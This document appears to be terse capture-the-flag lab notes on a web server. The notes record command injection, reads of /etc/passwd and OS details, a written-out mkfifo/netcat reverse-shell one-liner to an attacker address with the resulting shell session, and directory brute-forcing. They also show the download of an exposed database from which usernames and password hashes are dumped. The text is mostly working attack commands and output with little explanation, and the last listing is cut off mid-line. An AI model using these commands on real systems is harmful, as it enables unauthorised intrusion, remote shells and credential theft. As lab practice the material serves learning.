# injection

## 1
- ls
```
total 28 
drwxr-x--- 4 www-data www-data 4096 Jun 3 18:13 . 
drwxr-xr-x 3 root root 4096 May 18 15:21 .. 
drwxr-x--- 2 www-data www-data 4096 May 21 03:04 css 
-rw-r----- 1 www-data www-data 17 May 22 13:14 drpepper.txt 
-rw-r----- 1 www-data www-data 1723 May 26 01:52 evilshell.php 
-rw-r----- 1 www-data www-data 2200 May 21 03:04 index.php 
drwxr-x--- 2 www-data www-data 4096 May 21 03:04 js 
```
## 2
- cat /etc/passwd
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd
Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
```
## 3
- id
- whoami
```
www-data
```

## 4
```
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

# 5
- cat /etc/os-release
```
NAME="Ubuntu" VERSION="18.04.4 LTS (Bionic Beaver)" ID=ubuntu ID_LIKE=debian PRETTY_NAME="Ubuntu 18.04.4 LTS" VERSION_ID="18.04" HOME_URL="https://www.ubuntu.com/" SUPPORT_URL="https://help.ubuntu.com/" BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/" PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy" VERSION_CODENAME=bionic UBUNTU_CODENAME=bionic 
```



# 6
- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.108.72 1234 >/tmp/f

```
root@kali:~# nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.108.72] from (UNKNOWN) [10.10.179.185] 60408
/bin/sh: 0: can't access tty; job control turned off
$ ls
css
drpepper.txt
evilshell.php
index.php
js
$ find / -name 00-header -type f 2>/dev/null
/snap/core/8268/etc/update-motd.d/00-header
/snap/core/9066/etc/update-motd.d/00-header
/etc/update-motd.d/00-header
$ cat /etc/update-motd.d/00-header
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

[ -r /etc/lsb-release ] && . /etc/lsb-release

if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
        # Fall back to using the very slow lsb_release utility
        DISTRIB_DESCRIPTION=$(lsb_release -s -d)
fi

printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"

DR PEPPER MAKES THE WORLD TASTE BETTER!
$
```


# day2
- [ admin]

# day3

```
oot@kali:~# gobuster dir -u http://10.10.209.246 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.209.246
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/07/16 16:06:08 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/.hta (Status: 403)
/api (Status: 301)
/assets (Status: 301)
/console (Status: 301)
/favicon.ico (Status: 200)
/index.php (Status: 200)
/login (Status: 301)
/server-status (Status: 403)
===============================================================
2020/07/16 16:06:08 Finished


root@kali:~# wget http://10.10.209.246/assets/webapp.db
--2020-07-16 16:09:23--  http://10.10.209.246/assets/webapp.db
Connecting to 10.10.209.246:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 28672 (28K)
Saving to: ‘webapp.db’

webapp.db           100%[===================>]  28.00K  --.-KB/s    in 0s

2020-07-16 16:09:23 (323 MB/s) - ‘webapp.db’ saved [28672/28672]

root@kali:~# sqlite3 webapp.db
SQLite version 3.31.0 2019-12-29 00:52:41
Enter ".help" for usage hints.
sqlite> .tables
sessions  users
sqlite> select * from users
   ...> ;
4413096d9c933359b898b6202288a650|admin|6eea9b7ef19179a06954edd0f6c05ceb|1
23023b67a32488588db1e28579ced7ec|Bob|ad0234829205b9033196ba818f7a872b|1
4e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|0
sqlite> PRAGMA table_info(users);
0|userID|TEXT|1||1
1|username|TEXT|1||0
2|password|TEXT|1||0
3|admin|IN
```
